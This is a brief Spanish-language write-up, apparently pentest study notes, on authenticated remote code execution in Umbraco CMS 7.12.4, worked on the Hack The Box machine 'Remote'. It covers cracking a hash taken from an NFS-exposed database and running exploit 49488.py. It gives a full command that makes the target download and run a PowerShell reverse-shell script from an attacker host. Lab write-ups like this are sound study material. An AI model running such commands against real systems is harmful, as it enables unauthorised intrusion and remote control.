## DESCRIPTION

Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated).

![[Pasted image 20230228210603.png]]

#### Mas información
* https://fwhibbit.es/htb-writeup-remote

## EXPLOITATION

1. Para explotar esta vulnerabilidad necesitamos estar autenticados, en este ejemplo ha sido posible obtener de un directorio montado por nfs (podría ser smb o cualquier otro) la base de datos Umbraco.sdf -> De la que se ha obtenido un hash que ha sido posible crackearlo con hashcat.

2. Usamos el exploit: aspx/webapps/49488.py

![[Pasted image 20230228205417.png]]

3. Ejecutamos (levantamos un server http con Invoke-PowershellTcp antes)

```
python3 49488.py -u <<usuario>> -p <<contraseña>> -i '<<URL BASE>>' -c <<commando a ejecutar>>

#Ejemplo reverse shell con Powershell
python3 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "iex(new-object net.webclient).downloadstring('http://10.10.14.20/Invoke-PowerShellTcp.ps1')"
```

![[Pasted image 20230228205722.png]]

## MACHINES

* Hack The Box: Remote
